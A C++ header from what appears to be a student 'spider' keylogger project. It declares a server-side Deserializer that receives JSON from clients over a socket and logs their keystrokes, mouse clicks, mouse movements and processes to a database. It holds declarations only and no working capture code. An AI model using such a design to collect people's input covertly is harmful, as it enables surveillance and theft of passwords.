/*
** Serialize.h for  in /home/ouroub_a/rendu/spider-2017-krier_g/Server
**
** Made by amina ourouba
** Login   <ouroub_a@epitech.net>
**
** Started on  Fri Oct 31 11:04:46 2014 amina ourouba
** Last update Sat Nov  8 18:04:42 2014 amina ourouba
*/

#pragma once

#include <map>
#include <string>
#include <vector>
#include <boost/foreach.hpp>
#include <boost/property_tree/ptree.hpp>
#include <boost/property_tree/json_parser.hpp>
#include "DataBase.h"
#include "UnixSocket.h"

const int GREET = 1;
const unsigned int HEADER_SIZE = 52;
const unsigned int BUFFSIZE = 4096 - HEADER_SIZE;
const std::string HEADER_ERROR = "HEADER_ERROR";
const std::string MAGIC_KEY_ERROR = "ERR_MAGIC_KEY";
const std::string MAGIC_KEY  = "SPIDER42";

class Deserializer
{
private:
  typedef void (Deserializer::*loggerFunction)(UnixSocket::t_header_clean &h, boost::property_tree::ptree::value_type const& secondDepth);
  DataBase	*_db;
  std::map<std::string, Deserializer::loggerFunction> _mapFunctions;

private:
  void _processLogger(UnixSocket::t_header_clean &h, boost::property_tree::ptree::value_type const& secondDepth);
  void _mouseClickLogger(UnixSocket::t_header_clean &h, boost::property_tree::ptree::value_type const& secondDepth);
  void _mouseMoveLogger(UnixSocket::t_header_clean &h, boost::property_tree::ptree::value_type const& secondDepth);
  void _kbLogger(UnixSocket::t_header_clean &h, boost::property_tree::ptree::value_type const& secondDepth);
  void _clientLogger(UnixSocket::t_header_clean &h, boost::property_tree::ptree::value_type const& firstDepth);

public:
  Deserializer(std::string &passwd);
  int   DeserializeData(UnixSocket::t_header_clean &h, std::vector<std::string> &data);
  ~Deserializer();
};
